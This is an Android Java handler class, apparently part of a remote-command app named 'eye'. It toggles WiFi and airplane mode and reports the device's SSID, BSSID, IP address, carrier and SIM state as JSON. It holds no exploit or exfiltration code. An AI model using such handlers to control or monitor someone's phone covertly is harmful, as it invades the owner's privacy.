package com.idsiber.eye.handlers;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.idsiber.eye.CommandResult;

import org.json.JSONObject;

/**
 * Handler untuk kontrol jaringan seperti WiFi, data seluler, airplane mode
 */
public class NetworkHandler {
    private static final String TAG = "NetworkHandler";
    private Context context;

    public NetworkHandler(Context context) {
        this.context = context;
    }

    public CommandResult enableWifi() {
        try {
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            if (wifiManager == null) {
                return new CommandResult(false, "WiFi manager not available", null);
            }

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                // Android 10+ requires user interaction for WiFi toggle
                return new CommandResult(false, "WiFi control requires user interaction on Android 10+", null);
            } else {
                boolean result = wifiManager.setWifiEnabled(true);
                if (result) {
                    return new CommandResult(true, "WiFi enabled successfully", null);
                } else {
                    return new CommandResult(false, "Failed to enable WiFi", null);
                }
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to enable WiFi: " + e.getMessage(), null);
        }
    }

    public CommandResult disableWifi() {
        try {
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            if (wifiManager == null) {
                return new CommandResult(false, "WiFi manager not available", null);
            }

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                // Android 10+ requires user interaction for WiFi toggle
                return new CommandResult(false, "WiFi control requires user interaction on Android 10+", null);
            } else {
                boolean result = wifiManager.setWifiEnabled(false);
                if (result) {
                    return new CommandResult(true, "WiFi disabled successfully", null);
                } else {
                    return new CommandResult(false, "Failed to disable WiFi", null);
                }
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to disable WiFi: " + e.getMessage(), null);
        }
    }

    public CommandResult enableAirplaneMode() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
                if (!Settings.System.canWrite(context)) {
                    return new CommandResult(false, "Write settings permission required", null);
                }

                Settings.Global.putInt(context.getContentResolver(), 
                    Settings.Global.AIRPLANE_MODE_ON, 1);

                // Broadcast the change
                context.sendBroadcast(new android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED));

                return new CommandResult(true, "Airplane mode enabled", null);
            } else {
                Settings.System.putInt(context.getContentResolver(), 
                    Settings.System.AIRPLANE_MODE_ON, 1);
                
                context.sendBroadcast(new android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED));

                return new CommandResult(true, "Airplane mode enabled", null);
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to enable airplane mode: " + e.getMessage(), null);
        }
    }

    public CommandResult disableAirplaneMode() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
                if (!Settings.System.canWrite(context)) {
                    return new CommandResult(false, "Write settings permission required", null);
                }

                Settings.Global.putInt(context.getContentResolver(), 
                    Settings.Global.AIRPLANE_MODE_ON, 0);

                // Broadcast the change
                context.sendBroadcast(new android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED));

                return new CommandResult(true, "Airplane mode disabled", null);
            } else {
                Settings.System.putInt(context.getContentResolver(), 
                    Settings.System.AIRPLANE_MODE_ON, 0);
                
                context.sendBroadcast(new android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED));

                return new CommandResult(true, "Airplane mode disabled", null);
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to disable airplane mode: " + e.getMessage(), null);
        }
    }

    public CommandResult getNetworkInfo() {
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) 
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
            
            if (connectivityManager == null) {
                return new CommandResult(false, "ConnectivityManager not available", null);
            }

            JSONObject networkInfo = new JSONObject();
            
            // General connectivity
            NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
            networkInfo.put("is_connected", activeNetwork != null && activeNetwork.isConnected());
            
            if (activeNetwork != null) {
                networkInfo.put("connection_type", activeNetwork.getTypeName());
                networkInfo.put("connection_subtype", activeNetwork.getSubtypeName());
                networkInfo.put("is_roaming", activeNetwork.isRoaming());
                networkInfo.put("is_available", activeNetwork.isAvailable());
            }

            // WiFi info
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                JSONObject wifiInfo = new JSONObject();
                wifiInfo.put("wifi_enabled", wifiManager.isWifiEnabled());
                
                if (wifiManager.getConnectionInfo() != null) {
                    wifiInfo.put("ssid", wifiManager.getConnectionInfo().getSSID());
                    wifiInfo.put("bssid", wifiManager.getConnectionInfo().getBSSID());
                    wifiInfo.put("ip_address", wifiManager.getConnectionInfo().getIpAddress());
                    wifiInfo.put("signal_strength", wifiManager.getConnectionInfo().getRssi());
                    wifiInfo.put("link_speed", wifiManager.getConnectionInfo().getLinkSpeed());
                }
                
                networkInfo.put("wifi_info", wifiInfo);
            }

            // Mobile data info
            TelephonyManager telephonyManager = (TelephonyManager) 
                context.getSystemService(Context.TELEPHONY_SERVICE);
            
            if (telephonyManager != null) {
                JSONObject mobileInfo = new JSONObject();
                mobileInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
                mobileInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                mobileInfo.put("phone_type", getPhoneTypeString(telephonyManager.getPhoneType()));
                mobileInfo.put("network_type", getNetworkTypeString(telephonyManager.getNetworkType()));
                mobileInfo.put("has_icc_card", telephonyManager.hasIccCard());
                mobileInfo.put("sim_state", getSimStateString(telephonyManager.getSimState()));
                
                networkInfo.put("mobile_info", mobileInfo);
            }

            // Airplane mode status
            boolean isAirplaneModeOn;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
                isAirplaneModeOn = Settings.Global.getInt(context.getContentResolver(), 
                    Settings.Global.AIRPLANE_MODE_ON, 0) != 0;
            } else {
                isAirplaneModeOn = Settings.System.getInt(context.getContentResolver(), 
                    Settings.System.AIRPLANE_MODE_ON, 0) != 0;
            }
            networkInfo.put("airplane_mode", isAirplaneModeOn);

            return new CommandResult(true, "Network info retrieved", networkInfo.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get network info: " + e.getMessage(), null);
        }
    }

    private String getPhoneTypeString(int phoneType) {
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_GSM: return "GSM";
            case TelephonyManager.PHONE_TYPE_CDMA: return "CDMA";
            case TelephonyManager.PHONE_TYPE_SIP: return "SIP";
            case TelephonyManager.PHONE_TYPE_NONE: return "None";
            default: return "Unknown";
        }
    }

    private String getNetworkTypeString(int networkType) {
        switch (networkType) {
            case TelephonyManager.NETWORK_TYPE_GPRS: return "GPRS";
            case TelephonyManager.NETWORK_TYPE_EDGE: return "EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS: return "UMTS";
            case TelephonyManager.NETWORK_TYPE_HSDPA: return "HSDPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA: return "HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSPA: return "HSPA";
            case TelephonyManager.NETWORK_TYPE_CDMA: return "CDMA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0: return "EVDO_0";
            case TelephonyManager.NETWORK_TYPE_EVDO_A: return "EVDO_A";
            case TelephonyManager.NETWORK_TYPE_EVDO_B: return "EVDO_B";
            case TelephonyManager.NETWORK_TYPE_1xRTT: return "1xRTT";
            case TelephonyManager.NETWORK_TYPE_IDEN: return "iDEN";
            case TelephonyManager.NETWORK_TYPE_LTE: return "LTE";
            case TelephonyManager.NETWORK_TYPE_EHRPD: return "eHRPD";
            case TelephonyManager.NETWORK_TYPE_HSPAP: return "HSPA+";
            default: return "Unknown";
        }
    }

    private String getSimStateString(int simState) {
        switch (simState) {
            case TelephonyManager.SIM_STATE_ABSENT: return "Absent";
            case TelephonyManager.SIM_STATE_PIN_REQUIRED: return "PIN Required";
            case TelephonyManager.SIM_STATE_PUK_REQUIRED: return "PUK Required";
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED: return "Network Locked";
            case TelephonyManager.SIM_STATE_READY: return "Ready";
            case TelephonyManager.SIM_STATE_NOT_READY: return "Not Ready";
            case TelephonyManager.SIM_STATE_PERM_DISABLED: return "Permanently Disabled";
            case TelephonyManager.SIM_STATE_CARD_IO_ERROR: return "Card IO Error";
            case TelephonyManager.SIM_STATE_CARD_RESTRICTED: return "Card Restricted";
            case TelephonyManager.SIM_STATE_UNKNOWN: return "Unknown";
            default: return "Unknown";
        }
    }
}
